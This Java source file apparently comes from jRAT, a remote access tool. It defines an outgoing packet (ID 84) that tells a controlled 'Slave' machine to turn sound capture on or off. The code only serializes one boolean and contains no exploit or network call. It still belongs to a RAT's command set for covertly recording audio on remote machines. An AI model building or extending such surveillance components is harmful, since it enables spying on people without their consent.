package io.jrat.client.packets.outgoing;

import io.jrat.client.Slave;

import java.io.DataOutputStream;


public class Packet84SoundCapture extends AbstractOutgoingPacket {

	private boolean enable;

	public Packet84SoundCapture(boolean enable) {
		this.enable = enable;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeBoolean(enable);
	}

	@Override
	public byte getPacketId() {
		return 84;
	}

}
